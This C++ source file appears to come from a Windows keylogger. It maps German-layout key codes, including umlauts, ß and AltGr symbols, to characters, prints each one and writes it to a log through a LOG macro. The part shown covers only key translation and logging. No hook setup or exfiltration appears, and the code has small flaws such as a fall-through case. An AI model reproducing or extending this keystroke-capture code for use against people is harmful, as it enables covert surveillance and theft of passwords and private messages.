#include "pch.h"
#include "keytest.h"

bool LogSpecial(int S_Key) {
	if (GetAsyncKeyState(VK_MENU)) {
		switch (S_Key) {
		case VK_OEM_4:
			std::cout << "[backslash]";
			LOG('\\');
			return true;
		case VK_OEM_PLUS:
			std::cout << '~';
			LOG('~');
			return true;
		case VK_OEM_102:
			std::cout << '|';
			LOG('|');
			return true;
		default:
			return false;
		}
	}
	else if (GetKeyState(VK_CAPITAL) | GetAsyncKeyState(VK_SHIFT)) {
		switch (S_Key) {
		case VK_OEM_1:
			std::cout << "Ü";
			LOG("Ü");
			return true;
		case VK_OEM_2:
			std::cout << '\'';
			LOG('\'');
			return true;
		case VK_OEM_3:
			std::cout << "Ö";
			LOG("Ö");
			log::get().save('Ö');
			return true;
		case VK_OEM_4:
			std::cout << '?';
			LOG('?');
			return true;
		case VK_OEM_5:
			std::cout << "°";
			LOG("°");
			return true;
		case VK_OEM_6:
			std::cout << '`';
			LOG('`');
			return true;
		case VK_OEM_7:
			std::cout << "Ä";
			LOG("Ä");
			return true;
		case VK_OEM_PERIOD:
			std::cout << ':';
			LOG(':');
			return true;
		case VK_OEM_MINUS:
			std::cout << '_';
			LOG('_');
			return true;
		case VK_OEM_COMMA:
			std::cout << ';';
			LOG(';');
			return true;
		case VK_OEM_PLUS:
			std::cout << '*';
			LOG('*');
			return true;
		case VK_OEM_102:
			std::cout << '>';
			LOG('>');
			return true;
		default:
			return false;
		}
	}
	else {
		switch (S_Key) {
		case VK_SPACE:
			std::cout << ' ';
			LOG(' ');
			return true;
		case VK_SHIFT:
			return true;
		case 10:
			return true;
		case VK_RETURN:
			std::cout << "[return/enter]";
			LOG("[return/enter]");
			return true;
		case VK_BACK:
			std::cout << "[backspace]";
			LOG("[backspace]");
			return true;
		case VK_OEM_1:
			std::cout << "ü";
			LOG("ü");
			return true;
		case VK_OEM_2:
			std::cout << '#';
			LOG('#');
			return true;
		case VK_OEM_3:
			std::cout << "ö";
			LOG("ö");
			return true;
		case VK_OEM_4:
			std::cout << "ß";
			LOG("ß");
			return true;
		case VK_OEM_5:
			std::cout << '^';
			LOG('^');
			return true;
		case VK_OEM_6:
			std::cout << "´";
			LOG("´");
			return true;
		case VK_OEM_7:
			std::cout << "ä";
			LOG("ä");
			return true;
		case VK_OEM_PERIOD:
			std::cout << '.';
			LOG('.');
			return true;
		case VK_OEM_MINUS:
			std::cout << '-';
			LOG('-');
			return true;
		case VK_OEM_COMMA:
			std::cout << ',';
			LOG(',');
			return true;
		case VK_OEM_PLUS:
			std::cout << '+';
			LOG('+');
			return true;
		case VK_OEM_102:
			std::cout << '<';
			LOG('<');
			return true;
		default:
			return false;
		}
	}
	return false;
}

//Logger for shift-versions of 0-9 chars, small selection, slow
bool logSpecialNumber(int S_Key) {
	if (GetKeyState(VK_CAPITAL) | GetAsyncKeyState(VK_SHIFT)) {
		switch (S_Key) {
		case 48:
			std::cout << '=';
			LOG('=');
			return true;
		case 49:
			std::cout << '!';
			LOG('!');
			return true;
		case 50:
			std::cout << '\'';
			LOG('\'');
			return true;
		case 51:
			std::cout << "§";
			LOG('§');
			return true;
		case 52:
			std::cout << '$';
			LOG('$');
			return true;
		case 53:
			std::cout << '%';
			LOG('%');
			return true;
		case 54:
			std::cout << '&';
			LOG('&');
			return true;
		case 55:
			std::cout << '/';
			LOG('/');
			return true;
		case 56:
			std::cout << '(';
			LOG('(');
			return true;
		case 57:
			std::cout << ')';
			LOG(')');
		default: return true;
		}
	}
	else return false;
}

//Logger for chars 0-9, small selection, very quick
bool logNumber(int S_Key) {
	if (S_Key > 47 && S_Key < 58) {
		LOG(char(S_Key));
		return true;
	}
	else return false;
}

//Logger for chars a-z, large selection, quick
bool LogNormal(int S_Key) {
	bool qeAlt = false;
	//Special treatment for q and e on german keyboard
	if (S_Key == 69 || S_Key == 81) {
		if (GetAsyncKeyState(VK_MENU)) {
			switch (S_Key) {
			case 69:
				std::cout << "€";
				LOG("€");
				return true;
			case 81:
				std::cout << '@';
				LOG('@');
				return true;
			}
		}
	}
	if (GetKeyState(VK_CAPITAL) | GetAsyncKeyState(VK_SHIFT)) {
		LOG(char(S_Key));
	}
	else {
		LOG(char(S_Key + 32));
	}
	return true;
}